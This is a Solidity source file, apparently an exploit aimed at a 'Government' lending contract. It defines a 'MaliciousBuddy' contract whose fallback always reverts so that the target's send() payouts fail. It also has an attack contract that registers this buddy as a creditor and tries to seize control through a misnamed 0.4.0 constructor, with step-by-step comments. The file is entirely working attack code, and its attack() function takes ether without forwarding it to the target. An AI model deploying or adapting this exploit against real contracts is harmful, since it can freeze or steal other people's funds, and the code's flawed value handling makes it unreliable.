pragma solidity ^0.4.0;

interface IGovernment {
    function lendGovernmentMoney(address buddy) external payable returns (bool);
    function inheritToNextGeneration(address nextGen) external;
    function getCreditorAddresses() external returns (address[]);
}

contract MaliciousBuddy {
    function() external payable {
        // Intentionally consume all gas or revert to break send()
        revert();
    }
}

contract GovernmentExploit {
    IGovernment public target;
    MaliciousBuddy public evilBuddy;

    constructor(address _target) public {
        target = IGovernment(_target);
        evilBuddy = new MaliciousBuddy();
    }

    // Step 1: Join as creditor with large amount to activate logic
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        target.lendGovernmentMoney(address(evilBuddy));
    }

    // Step 2: Attempt to hijack corruptElite if possible (constructor misnamed in 0.4.0)
    function tryHijack() public {
        target.inheritToNextGeneration(msg.sender);
    }

    // Step 3: Check if we’re now in creditor list
    function getVictimCreditorList() public returns (address[]) {
        return target.getCreditorAddresses();
    }
}

